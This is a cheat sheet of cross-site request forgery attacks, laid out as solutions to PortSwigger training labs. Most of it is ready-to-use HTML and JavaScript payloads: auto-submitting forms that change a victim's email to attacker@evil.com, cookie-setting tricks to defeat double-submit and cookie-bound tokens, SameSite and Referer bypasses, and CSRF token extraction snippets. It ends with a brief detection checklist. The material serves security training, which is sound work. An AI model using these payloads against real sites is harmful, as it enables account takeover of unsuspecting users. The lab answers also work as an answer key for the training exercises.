# CSRF - Cross-Site Request Forgery Attack Techniques

## PortSwigger Lab Solutions

### Lab 1: CSRF vulnerability with no defenses
**Approach:** Simple CSRF - no token protection
**Exploit:**
```html
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

### Lab 2: CSRF where token validation depends on request method
**Approach:** Token checked for POST but not GET
**Exploit:**
```html
<img src="https://TARGET/my-account/change-email?email=attacker@evil.com" />
```

### Lab 3: CSRF where token validation depends on token being present
**Approach:** Token only validated if present in request
**Exploit:**
```html
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```
(Remove the CSRF token parameter entirely)

### Lab 4: CSRF where token is not tied to user session
**Approach:** Any valid CSRF token is accepted, regardless of session
**Steps:**
1. Log in as attacker (wiener)
2. Get a valid CSRF token from attacker's session
3. Use that token in exploit targeting victim (carlos)
**Exploit:**
```html
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="VALID_TOKEN_FROM_ATTACKER" />
</form>
<script>document.forms[0].submit();</script>
```

### Lab 5: CSRF where token is tied to non-session cookie
**Approach:** CSRF token validated against a separate cookie (not session)
**Steps:**
1. Find the cookie name used for CSRF validation
2. Set that cookie to match the CSRF token
**Exploit:**
```html
<script>
  // First, set the csrf cookie
  document.cookie = "csrfKey=VALID_KEY; domain=TARGET";
  // Then submit form with matching token
</script>
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="MATCHING_TOKEN" />
</form>
<script>document.forms[0].submit();</script>
```

### Lab 6: CSRF where token is duplicated in cookie
**Approach:** CSRF token in cookie must match token in form
**Exploit:**
```html
<script>
  // Cookie will be auto-sent, just need to set it to match
  document.cookie = "csrf=attacker_token; domain=TARGET";
</script>
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="csrf" value="attacker_token" />
</form>
<script>document.forms[0].submit();</script>
```

### Lab 7: SameSite Lax bypass via method override
**Approach:** GET request bypasses SameSite=Lax
**Exploit:**
```html
<form method="GET" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```
Or if POST is required:
```html
<form method="GET" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
  <input type="hidden" name="_method" value="POST" />
</form>
<script>document.forms[0].submit();</script>
```

### Lab 8: SameSite Strict bypass via sibling domain
**Approach:** Exploit sibling domain to bypass SameSite=Strict
**Steps:**
1. Find XSS or open redirect on sibling domain
2. Use it to set cookies or redirect to target

### Lab 9: SameSite Strict bypass via client-side redirect
**Approach:** Use client-side redirect to carry top-level navigation
**Exploit:**
```html
<script>
  // Trigger redirect that carries SameSite=Strict cookie
  location = "https://TARGET/redirect?to=my-account/change-email&email=attacker";
</script>
```

### Lab 10: CSRF where Referer validation depends on header being present
**Approach:** Remove or manipulate Referer header
**Exploit with meta tag:**
```html
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://TARGET/my-account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

### Lab 11: CSRF with broken Referer validation
**Approach:** Referer checked but can be bypassed with substring match
**Exploit:** Host exploit on URL containing target domain
```
https://attacker-TARGET.com/csrf-exploit.html
```

## Common CSRF Bypass Techniques

### Method Override
```html
<!-- Override POST to GET -->
<input type="hidden" name="_method" value="POST">
<!-- Or use X-HTTP-Method-Override header -->
```

### Referer Header Manipulation
```html
<!-- Remove Referer -->
<meta name="referrer" content="no-referrer">

<!-- Set custom Referer (only works in some contexts) -->
```

### SameSite Cookie Bypass
- **Lax bypass:** Use top-level GET navigation (window.open, anchor click)
- **Strict bypass:** Use client-side redirects, sibling domain attacks
- **None bypass:** Cookies with SameSite=None + no Secure flag

### Content-Type Manipulation
```html
<!-- Some servers accept non-standard content types -->
<form method="POST" action="https://TARGET/api/action" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}' />
</form>
```

## CSRF Token Extraction

### From Same Page
```javascript
// Extract token from meta tag
var token = document.querySelector('meta[name="csrf-token"]').content;

// Extract from hidden field
var token = document.querySelector('input[name="csrf"]').value;

// Extract from cookie
var token = document.cookie.match(/csrf=([^;]+)/)[1];
```

### From API Response
```javascript
// Fetch page and extract token
fetch('/my-account').then(r => r.text()).then(html => {
  var match = html.match(/name="csrf" value="([^"]+)"/);
  if (match) {
    // Use token in form submission
  }
});
```

## Detection Checklist

- [ ] POST forms without CSRF token
- [ ] GET requests that change state
- [ ] CSRF token not tied to session
- [ ] CSRF token in cookie (checkable via JS)
- [ ] SameSite attribute missing on session cookie
- [ ] Referer validation can be bypassed
- [ ] Method override available (_method, X-HTTP-Method-Override)
- [ ] Content-Type restriction missing
- [ ] CORS misconfiguration allows credential-bearing requests
